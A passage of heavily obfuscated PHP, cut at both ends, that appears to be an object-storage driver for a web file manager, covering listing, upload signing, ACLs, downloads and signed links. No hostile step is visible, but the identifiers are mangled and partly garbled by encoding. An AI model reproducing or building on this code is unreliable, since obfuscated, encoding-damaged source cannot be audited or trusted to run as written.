$›ñÒø† = trim($à¯ùŠæ¹, $ÔÌ§øˆ[8]) . $ÔÌ§øˆ[8]; if (!empty($à¯ùŠæ¹) && $à¯ùŠæ¹ !== $ÔÌ§øˆ[231] && !in_array($›ñÒø†, $Á€„ª½í[$ÔÌ§øˆ[85]])) { $Á€„ª½í[$ÔÌ§øˆ[85]][] = $›ñÒø†; } $–Ü•öØÖ = $this->delByBatch($Á€„ª½í[$ÔÌ§øˆ[86]]); if (!$–Ü•öØÖ) { return !1; } $–Ü•öØÖ = $this->delByBatch($Á€„ª½í[$ÔÌ§øˆ[85]]); if (!$–Ü•öØÖ) { return !1; } return $this->delFile($›ñÒø†); } private function delByBatch($„¸«Å¨½) { foreach (array_chunk($„¸«Å¨½, 1000) as $–¤û²ğÚ) { try { $this->client->deleteObjects($this->bucket, $–¤û²ğÚ); } catch (OSS\Core\OssException $úõŠíö˜) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][215] . $úõŠíö˜->getMessage()); return !1; } } return !0; } public function rename($âÌâš©Ô, $Õö¾êè“) { return $this->renameObject($âÌâš©Ô, $Õö¾êè“); } private function fileInfo($ô¿Ä°ÎÙ, $Š¿ÊùÃÒ = false, $ŒÍÂ´úŠ = array()) { $¿Ûæ£½å =& $_SERVER[¯‘·½]; $…¨¼Ğ·‡ = array($¿Ûæ£½å[32] => $this->pathThis($ô¿Ä°ÎÙ), $¿Ûæ£½å[87] => $this->getPathOuter($ô¿Ä°ÎÙ), $¿Ûæ£½å[33] => $¿Ûæ£½å[233], $¿Ûæ£½å[79] => isset($ŒÍÂ´úŠ[$¿Ûæ£½å[79]]) ? $ŒÍÂ´úŠ[$¿Ûæ£½å[79]] : 0, $¿Ûæ£½å[169] => $this->ext($ô¿Ä°ÎÙ)); if ($Š¿ÊùÃÒ) { return $…¨¼Ğ·‡; } $…¨¼Ğ·‡[$¿Ûæ£½å[234]] = $…¨¼Ğ·‡[$¿Ûæ£½å[88]] = 0; $…¨¼Ğ·‡[$¿Ûæ£½å[235]] = $…¨¼Ğ·‡[$¿Ûæ£½å[236]] = !0; if (empty($ŒÍÂ´úŠ)) { $Æ²–¼Áº = $this->objectMeta($ô¿Ä°ÎÙ); if (!$Æ²–¼Áº) { return $…¨¼Ğ·‡; } $ŒÍÂ´úŠ = array($¿Ûæ£½å[88] => strtotime($Æ²–¼Áº[$¿Ûæ£½å[1511]]), $¿Ûæ£½å[79] => $Æ²–¼Áº[$¿Ûæ£½å[1510]] + 0, $¿Ûæ£½å[1509] => $Æ²–¼Áº[$¿Ûæ£½å[1509]]); } if (isset($ŒÍÂ´úŠ[$¿Ûæ£½å[1509]]) && $ŒÍÂ´úŠ[$¿Ûæ£½å[1509]]) { $…¨¼Ğ·‡[$¿Ûæ£½å[238]] = trim($ŒÍÂ´úŠ[$¿Ûæ£½å[1509]], $¿Ûæ£½å[121]); } if (isset($ŒÍÂ´úŠ[$¿Ûæ£½å[79]])) { $…¨¼Ğ·‡[$¿Ûæ£½å[79]] = $ŒÍÂ´úŠ[$¿Ûæ£½å[79]]; } if (isset($ŒÍÂ´úŠ[$¿Ûæ£½å[88]])) { $…¨¼Ğ·‡[$¿Ûæ£½å[88]] = $ŒÍÂ´úŠ[$¿Ûæ£½å[88]]; } if (isset($ŒÍÂ´úŠ[$¿Ûæ£½å[207]]) && !trim($…¨¼Ğ·‡[$¿Ûæ£½å[88]])) { $…¨¼Ğ·‡[$¿Ûæ£½å[88]] = $ŒÍÂ´úŠ[$¿Ûæ£½å[207]]; } return $…¨¼Ğ·‡; } private function folderInfo($İ©¬Ú €, $ûÕ¹—²É = false, $èáò¨È± = array()) { $§«Íï•Ş =& $_SERVER[¯‘·½]; $öªİ±çŞ = array($§«Íï•Ş[32] => $this->pathThis($İ©¬Ú €), $§«Íï•Ş[87] => $this->getPathOuter($§«Íï•Ş[8] . $İ©¬Ú €), $§«Íï•Ş[33] => $§«Íï•Ş[78]); if ($ûÕ¹—²É) { return $öªİ±çŞ; } $öªİ±çŞ[$§«Íï•Ş[234]] = $öªİ±çŞ[$§«Íï•Ş[88]] = 0; $öªİ±çŞ[$§«Íï•Ş[235]] = $öªİ±çŞ[$§«Íï•Ş[236]] = !0; if (empty($èáò¨È±)) { $İ©¬Ú € = rtrim($İ©¬Ú €, $§«Íï•Ş[8]) . $§«Íï•Ş[8]; $ÄúÎÀâ® = $this->objectMeta($İ©¬Ú €); if (!$ÄúÎÀâ®) { return $öªİ±çŞ; } $èáò¨È± = array($§«Íï•Ş[234] => $ÄúÎÀâ®[$§«Íï•Ş[579]][$§«Íï•Ş[1514]], $§«Íï•Ş[88] => strtotime($ÄúÎÀâ®[$§«Íï•Ş[1511]])); } if (isset($èáò¨È±[$§«Íï•Ş[88]])) { $öªİ±çŞ[$§«Íï•Ş[88]] = $èáò¨È±[$§«Íï•Ş[88]]; } if (isset($èáò¨È±[$§«Íï•Ş[234]])) { $öªİ±çŞ[$§«Íï•Ş[234]] = $èáò¨È±[$§«Íï•Ş[234]]; } return $öªİ±çŞ; } public function listPath($›½Ş¨»—, $Â²±­® = false) { $‡¡‘í»º =& $_SERVER[¯‘·½]; $ğ´È°‡Å = $this->fileList($›½Ş¨»—, $‡¡‘í»º[8], !0); foreach ($ğ´È°‡Å[$‡¡‘í»º[85]] as $õÍ™Ûòñ => $¨À²ÃØ‹) { $ğ´È°‡Å[$‡¡‘í»º[85]][$õÍ™Ûòñ] = $this->folderInfo($¨À²ÃØ‹, $Â²±­®, $¨À²ÃØ‹); } foreach ($ğ´È°‡Å[$‡¡‘í»º[86]] as $õÍ™Ûòñ => $¨À²ÃØ‹) { $ğ´È°‡Å[$‡¡‘í»º[86]][$õÍ™Ûòñ] = $this->fileInfo($¨À²ÃØ‹[$‡¡‘í»º[32]], $Â²±­®, $¨À²ÃØ‹); } return $ğ´È°‡Å; } protected function infoChildren($ş×¢´ûƒ, &$ú“„˜Ú´) { $Û‡Ôü‚Ú =& $_SERVER[¯‘·½]; $œØÓéÀØ = $this->fileList($ş×¢´ûƒ, $Û‡Ôü‚Ú[12], !0); $ú“„˜Ú´[$Û‡Ôü‚Ú[81]] += count($œØÓéÀØ[$Û‡Ôü‚Ú[85]]); $ú“„˜Ú´[$Û‡Ôü‚Ú[80]] += count($œØÓéÀØ[$Û‡Ôü‚Ú[86]]); foreach ($œØÓéÀØ[$Û‡Ôü‚Ú[86]] as $òëÜ ê¾) { if (!$òëÜ ê¾ || !$òëÜ ê¾[$Û‡Ôü‚Ú[79]]) { continue; } $ú“„˜Ú´[$Û‡Ôü‚Ú[79]] += $òëÜ ê¾[$Û‡Ôü‚Ú[79]]; } } public function has($–¼Ü¯ ‰, $ÊÜ¦÷ğô = false, $ú§©àŒ = true) { $Ş£â¤ûî =& $_SERVER[¯‘·½]; $–¼Ü¯ ‰ = trim($–¼Ü¯ ‰, $Ş£â¤ûî[8]); $Ş¿Üšªø = empty($–¼Ü¯ ‰) && $–¼Ü¯ ‰ !== $Ş£â¤ûî[231] ? $Ş£â¤ûî[12] : $–¼Ü¯ ‰ . $Ş£â¤ûî[8]; $¡«¾ŞÙ• = $Ş£â¤ûî[12]; $Ãâ€ğÑ¢ = 500; $õµ×‘Ş´ = $ÂäãØŞ¹ = 0; while (!0) { check_abort(); $ŠÜÇ¸ÌË = array($Ş£â¤ûî[1505] => $Ş£â¤ûî[8], $Ş£â¤ûî[1506] => $Ş¿Üšªø, $Ş£â¤ûî[1507] => $Ãâ€ğÑ¢, $Ş£â¤ûî[1508] => $¡«¾ŞÙ•); try { $Õï´ş¶Ğ = $this->client->listObjects($this->bucket, $ŠÜÇ¸ÌË); } catch (OSS\Core\OssException $úÖ“Æ·Ê) { $this->writeLog(__FUNCTION__ . $Ş£â¤ûî[215] . $úÖ“Æ·Ê->getMessage()); break; } $¡«¾ŞÙ• = $Õï´ş¶Ğ->getNextMarker(); $Š…º‰œº = $Õï´ş¶Ğ->getObjectList(); $Ùóšã¢½ = $Õï´ş¶Ğ->getPrefixList(); if ($ÊÜ¦÷ğô) { if (count($Š…º‰œº) > 1 || count($Š…º‰œº) == 1 && $Š…º‰œº[0]->getKey() != $Ş¿Üšªø) { $õµ×‘Ş´ += count($Š…º‰œº) - 1; } if (!empty($Ùóšã¢½)) { $ÂäãØŞ¹ += count($Ùóšã¢½); } if ($¡«¾ŞÙ• === $Ş£â¤ûî[12]) { break; } continue; } if ($ú§©àŒ) { if (!empty($Š…º‰œº)) { if (count($Š…º‰œº) > 1 || $Š…º‰œº[0]->getKey() != $Ş¿Üšªø) { return !0; } } } else { if (!empty($Ùóšã¢½)) { return !0; } } if ($¡«¾ŞÙ• === $Ş£â¤ûî[12]) { break; } } if ($ÊÜ¦÷ğô) { return array($Ş£â¤ûî[242] => $õµ×‘Ş´, $Ş£â¤ûî[243] => $ÂäãØŞ¹); } return !1; } public function listAll($¿Äí§†) { $£’£åê¾ =& $_SERVER[¯‘·½]; $ò¦´µ½Ù = $this->fileList($¿Äí§†, $£’£åê¾[12], !0); $ÖÀÕ› = array_to_keyvalue($ò¦´µ½Ù[$£’£åê¾[86]], $£’£åê¾[32]); foreach ($ò¦´µ½Ù[$£’£åê¾[85]] as $¢¥‘ğôò) { if (is_string($¢¥‘ğôò)) { $ÖÀÕ›[$¢¥‘ğôò] = array($£’£åê¾[79] => 0); } } return $this->listAllFiles($¿Äí§†, $ÖÀÕ›); } public function canRead($úÕâàŸÓ) { $Êİ ±úó =& $_SERVER[¯‘·½]; $¹™Æé”À = $this->pathAcl($úÕâàŸÓ); return $¹™Æé”À == $Êİ ±úó[1515] || $¹™Æé”À == $Êİ ±úó[626] ? !0 : !1; } public function canWrite($’úÍşäÈ) { $°‰«òà = $this->pathAcl($’úÍşäÈ); return $°‰«òà == $_SERVER[¯‘·½][626] ? !0 : !1; } public function pathAcl($¬é´¥Äë) { $»¥®ÎŠô =& $_SERVER[¯‘·½]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $á¯ó¸ñ¶ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¬é´¥Äë)); } catch (OSS\Core\OssException $»ÀÍ¥Î») { $this->writeLog(__FUNCTION__ . $»¥®ÎŠô[215] . $»ÀÍ¥Î»->getMessage()); return !1; } $Ôâ‘»´ä = $á¯ó¸ñ¶ == $»¥®ÎŠô[37] ? $this->bucketAcl : $á¯ó¸ñ¶; if ($Ôâ‘»´ä == $»¥®ÎŠô[1516]) { return $»¥®ÎŠô[1515]; } if ($Ôâ‘»´ä == $»¥®ÎŠô[1517]) { return $»¥®ÎŠô[626]; } return $Ôâ‘»´ä; } private function chmodPath($°ŞªÈÅ, $çÀÈÏîó = '') { $ıİ‹Â¥µ =& $_SERVER[¯‘·½]; $Œ¢¦àãÊ = empty($çÀÈÏîó) ? $ıİ‹Â¥µ[1517] : $çÀÈÏîó; $†ÜÖş¿¶ = array($ıİ‹Â¥µ[37], $ıİ‹Â¥µ[232], $ıİ‹Â¥µ[1516], $ıİ‹Â¥µ[1517]); if (!in_array($Œ¢¦àãÊ, $†ÜÖş¿¶)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($°ŞªÈÅ), $Œ¢¦àãÊ); } catch (OSS\Core\OssException $ÕÃ¤Ûß£) { $this->writeLog(__FUNCTION__ . $ıİ‹Â¥µ[215] . $ÕÃ¤Ûß£->getMessage()); return !1; } return !0; } public function getContent($ºä×›á€) { return $this->fileSubstr($ºä×›á€, -1); } public function setContent($şë—¥ã, $åŠø•½ = '') { $Û„ìéşæ =& $_SERVER[¯‘·½]; try { $„¢¾ÙäÉ = $this->trafficLimit($Û„ìéşæ[1518]); $¼¶¾ ªª = $this->client->putObject($this->bucket, $this->pathEncode($şë—¥ã), $åŠø•½, $„¢¾ÙäÉ); } catch (OSS\Core\OssException $¬„È¢ö²) { $this->writeLog(__FUNCTION__ . $Û„ìéşæ[215] . $¬„È¢ö²->getMessage()); return !1; } $Ò’¿ÁÂĞ = array($Û„ìéşæ[1512] => trim($¼¶¾ ªª[$Û„ìéşæ[1509]], $Û„ìéşæ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($şë—¥ã))); $this->updateObjMeta($şë—¥ã, $Ò’¿ÁÂĞ); return isset($¼¶¾ ªª[$Û„ìéşæ[1519]][$Û„ìéşæ[297]]) ? !0 : !1; } private function updateObjMeta($‰¢†ü¾¸, $Ã©âÍ¼•) { $‰¢†ü¾¸ = $this->pathEncode($‰¢†ü¾¸); try { $¥¿´ëŞ = array(OSS\OssClient::OSS_HEADERS => $Ã©âÍ¼•); $this->client->copyObject($this->bucket, $‰¢†ü¾¸, $this->bucket, $‰¢†ü¾¸, $¥¿´ëŞ); } catch (OSS\Core\OssException $¼¾ü¤½š) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][215] . $¼¾ü¤½š->getMessage()); return !1; } return !0; } public function upload($ËÇÕÚš, $•ê‡‡ƒ, $–ÏÍÄÕ = false, $ë€Ö×´â = REPEAT_REPLACE) { $†ÖÚÑÌ =& $_SERVER[¯‘·½]; $è’½ÆÕÄ = trim($ËÇÕÚš, $†ÖÚÑÌ[8]); $Ò¸èİÕ« = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($†ÖÚÑÌ[1512] => @md5_file($•ê‡‡ƒ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ËÇÕÚš))); $Ò¸èİÕ« = $this->trafficLimit($†ÖÚÑÌ[1518], $Ò¸èİÕ«); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($è’½ÆÕÄ), $•ê‡‡ƒ, $Ò¸èİÕ«); } catch (OSS\Core\OssException $Á•âÌü÷) { $this->writeLog(__FUNCTION__ . $†ÖÚÑÌ[215] . $Á•âÌü÷->getMessage()); return !1; } return $this->getPathOuter($ËÇÕÚš); } public function getHost() { $Ö»Ú•® =& $_SERVER[¯‘·½]; $«ã¿½¬† = explode($Ö»Ú•®[211], parent::getHost()); return $«ã¿½¬†[0] . $Ö»Ú•®[211] . $this->bucket . $Ö»Ú•®[10] . $«ã¿½¬†[1]; } public function uploadFormData($†½±…í¿, $‘Ô´öôâ = 3600) { $Æ÷Ù³¶Â =& $_SERVER[¯‘·½]; if (!($íÕçÍ•Ÿ = $this->getHost())) { return !1; } $ëÖ–ß»‹ = $‘Ô´öôâ; $Ó¶íõö• = date($Æ÷Ù³¶Â[1520], time() + $ëÖ–ß»‹); $Ã»ƒŞîò = new DateTime($Ó¶íõö•); $ÁşûØ = $Ã»ƒŞîò->format(DateTime::ISO8601); $‘Â•™ = strpos($ÁşûØ, $Æ÷Ù³¶Â[373]); $ÁşûØ = substr($ÁşûØ, 0, $‘Â•™) . $Æ÷Ù³¶Â[1521]; $œ¯Şã§ = 1048576000 * 5; $Æ‚Éüã = $this->pathFather($†½±…í¿); $·À«Î› = array($Æ÷Ù³¶Â[265] => $ÁşûØ, $Æ÷Ù³¶Â[268] => array(array($Æ÷Ù³¶Â[1522], 0, $œ¯Şã§), array($Æ÷Ù³¶Â[270], $Æ÷Ù³¶Â[271], $Æ‚Éüã))); $»¹Ş‚ã = base64_encode(json_encode($·À«Î›)); $¶¶±Íµâ = base64_encode(hash_hmac($Æ÷Ù³¶Â[1443], $»¹Ş‚ã, $this->secret, !0)); $¶³ƒÖê€ = array($Æ÷Ù³¶Â[1523] => $this->accessKey, $Æ÷Ù³¶Â[280] => $»¹Ş‚ã, $Æ÷Ù³¶Â[273] => $Æ÷Ù³¶Â[264], $Æ÷Ù³¶Â[1524] => $¶¶±Íµâ, $Æ÷Ù³¶Â[209] => $íÕçÍ•Ÿ); $¶³ƒÖê€ = $this->trafficLimit($Æ÷Ù³¶Â[1518], $¶³ƒÖê€, !0); return $¶³ƒÖê€; } public function uploadMultiData($›ÜŸ‰Ò§, $õº‘òªÑ = 3600) { $å…ù¡Ãµ =& $_SERVER[¯‘·½]; if (!($ŞÈ³ÉĞ£ = $this->getHost())) { return !1; } $Ë“ìôµš = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($›ÜŸ‰Ò§)); return array($å…ù¡Ãµ[284] => $Ë“ìôµš, $å…ù¡Ãµ[209] => $ŞÈ³ÉĞ£ . $å…ù¡Ãµ[8] . $this->pathEncode($›ÜŸ‰Ò§), $å…ù¡Ãµ[285] => gmdate($å…ù¡Ãµ[1525]), $å…ù¡Ãµ[97] => $›ÜŸ‰Ò§); } public function uploadMultiAuth($¤¹Ë­•Í, $ÈÃ¾şé‡ = array()) { if (isset($ÈÃ¾şé‡[$_SERVER[¯‘·½][286]])) { return $this->uploadPartAuth($¤¹Ë­•Í, $ÈÃ¾şé‡); } return $this->uploadListAuth($¤¹Ë­•Í, $ÈÃ¾şé‡); } private function uploadPartAuth($Î¦˜³«­, $í•øÓ¿ß = array()) { $Ÿ¹åï¬ =& $_SERVER[¯‘·½]; $Ì¡ÍÎ¾º = $í•øÓ¿ß[$Ÿ¹åï¬[97]]; $İ¦óÖ¸œ = $this->_getUploadAuth($Ì¡ÍÎ¾º, $í•øÓ¿ß); $ Îíµéñ = array($Ÿ¹åï¬[289] => $İ¦óÖ¸œ[$Ÿ¹åï¬[289]], $Ÿ¹åï¬[285] => $İ¦óÖ¸œ[$Ÿ¹åï¬[285]]); if (isset($İ¦óÖ¸œ[$Ÿ¹åï¬[1526]])) { $ Îíµéñ[$Ÿ¹åï¬[1526]] = $İ¦óÖ¸œ[$Ÿ¹åï¬[1526]]; } return $ Îíµéñ; } private function uploadListAuth($ÈÁ¬™ş·, $­àóèö¸ = array()) { $ôñÔªÛí =& $_SERVER[¯‘·½]; $ÔïÈıÀ = $­àóèö¸[$ôñÔªÛí[97]]; $ÎÓ¹ëäø = $­àóèö¸[$ôñÔªÛí[284]]; $ßïÛü’Ï = $this->client->listParts($this->bucket, $this->pathEncode($ÔïÈıÀ), $ÎÓ¹ëäø); $Ã¼¦îì = $ßïÛü’Ï->getListPart(); $œÆàòÍµ = array(); foreach ($Ã¼¦îì as $¤­›íÈ„) { $œÆàòÍµ[] = array($ôñÔªÛí[300] => $¤­›íÈ„->getPartNumber(), $ôñÔªÛí[301] => trim($¤­›íÈ„->getETag(), $ôñÔªÛí[121])); } if (!$œÆàòÍµ) { return !1; } $¶Å‹Âƒ— = $this->_getUploadAuth($ÔïÈıÀ, $­àóèö¸); return array($ôñÔªÛí[289] => $¶Å‹Âƒ—[$ôñÔªÛí[289]], $ôñÔªÛí[285] => $¶Å‹Âƒ—[$ôñÔªÛí[285]], $ôñÔªÛí[292] => $œÆàòÍµ); } private function _getUploadAuth($€í®ûÖ¯, $½ãÈ¨×›) { $¬¶ÛÀº =& $_SERVER[¯‘·½]; $ÁÔ®Ûê = gmdate($¬¶ÛÀº[1525]); $©Êï÷Õë = isset($½ãÈ¨×›[$¬¶ÛÀº[286]]) ? $¬¶ÛÀº[256] : $¬¶ÛÀº[291]; $èŒ¸™£Ø = array_intersect_key($½ãÈ¨×›, array_flip(array($¬¶ÛÀº[286], $¬¶ÛÀº[284]))); ksort($èŒ¸™£Ø); $¡ö£è½ = $èŒ¸™£Ø ? $¬¶ÛÀº[76] . http_build_query($èŒ¸™£Ø, null, $¬¶ÛÀº[287], PHP_QUERY_RFC3986) : $¬¶ÛÀº[12]; $êİ©ÌÙõ = array($©Êï÷Õë, $¬¶ÛÀº[12], $¬¶ÛÀº[123], $ÁÔ®Ûê, "\170\55\x6f\163\x73\55\144\141\x74\x65\x3a{$ÁÔ®Ûê}", $¬¶ÛÀº[8] . $this->bucket . $¬¶ÛÀº[8] . $€í®ûÖ¯ . $¡ö£è½); if (isset($½ãÈ¨×›[$¬¶ÛÀº[286]])) { $ÙÒ¤Ù•Ù = $this->trafficLimit($¬¶ÛÀº[1518], array(), !0); if ($ÙÒ¤Ù•Ù) { $€í®ûÖ¯ = $¬¶ÛÀº[1526]; array_splice($êİ©ÌÙõ, 5, 0, $€í®ûÖ¯ . $¬¶ÛÀº[4] . $ÙÒ¤Ù•Ù[$€í®ûÖ¯]); } } $‚¨ôóŞñ = implode($¬¶ÛÀº[288], $êİ©ÌÙõ); $Şî°¼µÖ = base64_encode(hash_hmac($¬¶ÛÀº[1443], $‚¨ôóŞñ, $this->secret, !0)); $îç€º›ö = $¬¶ÛÀº[1495] . $this->accessKey . $¬¶ÛÀº[4] . $Şî°¼µÖ; $±è²ÛÇ = array($¬¶ÛÀº[289] => $îç€º›ö, $¬¶ÛÀº[285] => $ÁÔ®Ûê); if (!empty($ÙÒ¤Ù•Ù)) { $±è²ÛÇ = array_merge($±è²ÛÇ, $ÙÒ¤Ù•Ù); } return $±è²ÛÇ; } public function download($¸óçÀ ™, $ ÄĞ€—à) { $¥ÑŞà¿« =& $_SERVER[¯‘·½]; if ($this->isFolder($¸óçÀ ™)) { return !1; } try { $ş¢â‡¾€ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ ÄĞ€—à); $ş¢â‡¾€ = $this->trafficLimit($¥ÑŞà¿«[112], $ş¢â‡¾€); $this->client->getObject($this->bucket, $this->pathEncode($¸óçÀ ™), $ş¢â‡¾€); } catch (OSS\Core\OssException $’ûÈÜéÛ) { $this->writeLog(__FUNCTION__ . $¥ÑŞà¿«[215] . $’ûÈÜéÛ->getMessage()); return !1; } return $ ÄĞ€—à; } public function fileSubstr($šú§ãâÇ, $ëí¬ç¸  = 0, $›Ãœœ¢ = false) { if ($ëí¬ç¸  === -1) { $¶àÀß÷Ä = array(); } else { if ($›Ãœœ¢ === !1) { $Ò­¡“¬Ö = $this->size($šú§ãâÇ); } else { $Ò­¡“¬Ö = $ëí¬ç¸  + $›Ãœœ¢ - 1; } $¶àÀß÷Ä = array(OSS\OssClient::OSS_RANGE => "{$ëí¬ç¸ }\x2d{$Ò­¡“¬Ö}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($šú§ãâÇ), $¶àÀß÷Ä); } catch (OSS\Core\OssException $ÈËşŞ‹×) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][215] . $ÈËşŞ‹×->getMessage()); think_exception($ÈËşŞ‹×->getMessage()); return !1; } } private function trafficLimit($°§ø˜­¾, $¤Æˆ²ã‘ = array(), $·È²Š• = false) { $ ¨µù†‹ =& $_SERVER[¯‘·½]; if ($°§ø˜­¾ == $ ¨µù†‹[1518] && $this->isUploadServer() || $°§ø˜­¾ == $ ¨µù†‹[112] && $this->isFileOutServer()) { return $¤Æˆ²ã‘; } $Ä…Æƒ¶İ = floatval($GLOBALS[$ ¨µù†‹[6]][$ ¨µù†‹[92]][$ ¨µù†‹[110]][$°§ø˜­¾]) * 1024 * 1024 * 8; if (!$Ä…Æƒ¶İ) { return $¤Æˆ²ã‘; } $Ä…Æƒ¶İ = $Ä…Æƒ¶İ < 819200 ? 819200 : ($Ä…Æƒ¶İ > 838860800 ? 838860800 : $Ä…Æƒ¶İ); if ($·È²Š•) { $¤Æˆ²ã‘[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ä…Æƒ¶İ); } else { if (!isset($¤Æˆ²ã‘[OSS\OssClient::OSS_HEADERS])) { $¤Æˆ²ã‘[OSS\OssClient::OSS_HEADERS] = array(); } $¤Æˆ²ã‘[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ä…Æƒ¶İ); } return $¤Æˆ²ã‘; } public function link($õÑ­àšÜ, $ü’Î–¦® = array()) { $Íö­“÷Ä =& $_SERVER[¯‘·½]; if (!$this->exist($õÑ­àšÜ) || $this->isFolder($õÑ­àšÜ)) { return !1; } try { $ü’Î–¦® = $this->trafficLimit($Íö­“÷Ä[112], $ü’Î–¦®, !0); $·œ‹‹Üµ = $this->client->signUrl($this->bucket, $this->pathEncode($õÑ­àšÜ), 3600 * 12, $Íö­“÷Ä[1527], $ü’Î–¦®); return $this->getCdnLink($·œ‹‹Üµ); } catch (OSS\Core\OssException $Î¾¦Áãè) { $this->writeLog(__FUNCTION__ . $Íö­“÷Ä[215] . $Î¾¦Áãè->getMessage()); return !1; } } public function fileOut($­îğ¼¸á, $…Åöåö° = false, $óê‰Œù¢ = false, $³ÇÜ–Ê˜ = '') { $±õÇ­ä’ =& $_SERVER[¯‘·½]; if ($this->isFileOutServer()) { return $this->fileOutServer($­îğ¼¸á, $…Åöåö°, $óê‰Œù¢, $³ÇÜ–Ê˜); } if (!$óê‰Œù¢) { $óê‰Œù¢ = $this->pathThis($­îğ¼¸á); } $óê‰Œù¢ = rawurlencode($óê‰Œù¢); $ƒ¼¸»Æ = get_file_mime(get_path_ext($óê‰Œù¢)); if ($ƒ¼¸»Æ == $±õÇ­ä’[251]) { return parent::fileOut($­îğ¼¸á, $…Åöåö°, $óê‰Œù¢, $³ÇÜ–Ê˜); } $…Åöåö° = $…Åöåö° ? $±õÇ­ä’[1528] : $±õÇ­ä’[1529]; $óôûÄø® = array(OSS\OssClient::OSS_SUB_RESOURCE => $±õÇ­ä’[1530] . rawurlencode("{$…Åöåö°}\x3b\146\151\x6c\145\x6e\x61\x6d\145\x3d{$óê‰Œù¢}")); $œ¤ÀË = $this->link($­îğ¼¸á, $óôûÄø®); $this->fileOutLink($œ¤ÀË); } public function fileOutServer($—òù²ÄÇ, $ÅÇ¡ôÑÕ = false, $Õ¡¢Ğ•£ = false, $É¹ü½ = '') { parent::fileOut($—òù²ÄÇ, $ÅÇ¡ôÑÕ, $Õ¡¢Ğ•£, $É¹ü½); } public function fileOutImage($Á·õºØ­, $œØ¡‘‰  = 250) { if ($this->size($Á·õºØ­) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Á·õºØ­, $œØ¡‘‰ ); } $èÀçËü¦ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¯‘·½][1492] . $œØ¡‘‰ ); $ş‡¹¶ÚÉ = $this->link($Á·õºØ­, $èÀçËü¦); $this->fileOutLink($ş‡¹¶ÚÉ); } public function fileOutImageServer($ÒŠ´»¨, $é£çÂñ” = 250) { parent::fileOutImage($ÒŠ´»¨, $é£çÂñ”); } public function fileOutLink($¤–ôÇÎö) { $…ÆŠÚë =& $_SERVER[¯‘·½]; if (!$this->isCdnHost() && substr($¤–ôÇÎö, 0, 7) == $…ÆŠÚë[219]) { $¤–ôÇÎö = $…ÆŠÚë[220] . substr($¤–ôÇÎö, 7); } header($…ÆŠÚë[175] . $¤–ôÇÎö); die; } public function hashMd5($àÔå¿Ïø, $‡´²¢Åø = '') { $³îÇùªİ =& $_SERVER[¯‘·½]; $ÓÚğâ÷” = $this->_objectMeta($àÔå¿Ïø); if (!$ÓÚğâ÷”) { return $³îÇùªİ[12]; } if (!isset($ÓÚğâ÷”[$³îÇùªİ[1512]]) && !empty($‡´²¢Åø)) { $ÀÆÒŞ£¸ = $this->updateObjMeta($àÔå¿Ïø, array($³îÇùªİ[1512] => $‡´²¢Åø)); $ÓÚğâ÷”[$³îÇùªİ[1512]] = $ÀÆÒŞ£¸ ? $‡´²¢Åø : $³îÇùªİ[12]; } return isset($ÓÚğâ÷”[$³îÇùªİ[1512]]) ? strtolower($ÓÚğâ÷”[$³îÇùªİ[1512]]) : $³îÇùªİ[12]; } public function size($ñáÉ¨…¬) { $ä«â‡¤ = $this->objectMeta($ñáÉ¨…¬); return $ä«â‡¤ ? $ä«â‡¤[$_SERVER[¯‘·½][79]] : 0; } public function info($ŞŸÅ«şú) { if ($this->isFolder($ŞŸÅ«şú)) { return $this->folderInfo($ŞŸÅ«şú); } else { if ($this->isFile($ŞŸÅ«şú)) { return $this->fileInfo($ŞŸÅ«şú); } } return !1; } public function exist($§²®àéª) { return $this->isFile($§²®àéª) || $this->isFolder($§²®àéª); } public function isFile($¦†êèíÀ) { return !$this->isFolder($¦†êèíÀ) && $this->objectMeta($¦†êèíÀ); } public function isFolder($ÌˆõïäË) { return $this->cacheMethod($_SERVER[¯‘·½][180], $ÌˆõïäË); } protected function objectMeta($ÚèèîÄ) { return $this->cacheMethod($_SERVER[¯‘·½][182], $ÚèèîÄ); } protected function _objectMeta($èÅÕßäŠ) { $‚†Éäª  =& $_SERVER[¯‘·½]; try { $¸Ø…öÆĞ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($èÅÕßäŠ)); } catch (OSS\Core\OssException $ØÊ…šòƒ) { $this->writeLog(__FUNCTION__ . $‚†Éäª [215] . $ØÊ…šòƒ->getMessage()); $¸Ø…öÆĞ = !1; } if ($¸Ø…öÆĞ) { $¸Ø…öÆĞ[$‚†Éäª [79]] = intval($¸Ø…öÆĞ[$‚†Éäª [1510]]); } return $¸Ø…öÆĞ; } protected function _isFolder($æ©’ÄÙ¡) { $áÏ“Ùâ– =& $_SERVER[¯‘·½]; if ($æ©’ÄÙ¡ == $áÏ“Ùâ–[12] || $æ©’ÄÙ¡ == $áÏ“Ùâ–[8]) { return !0; } $Şùª‘©Š = array($áÏ“Ùâ–[1505] => $áÏ“Ùâ–[8], $áÏ“Ùâ–[1506] => rtrim($æ©’ÄÙ¡, $áÏ“Ùâ–[8]) . $áÏ“Ùâ–[8], $áÏ“Ùâ–[1507] => 1, $áÏ“Ùâ–[1508] => $áÏ“Ùâ–[12]); $…ğé¿‰¸ = $this->client->listObjects($this->bucket, $Şùª‘©Š); if ($…ğé¿‰¸->getObjectList() || $…ğé¿‰¸->getPrefixList()) { return !0; } return !1; } public function writeLog($ì‹Ş‹÷ = '', $ò¼À‹öº = false) { $ôôË — =& $_SERVER[¯‘·½]; $¦ßïÆİã = in_array(ACTION, array($ôôË —[213], $ôôË —[214])); if (!$¦ßïÆİã && 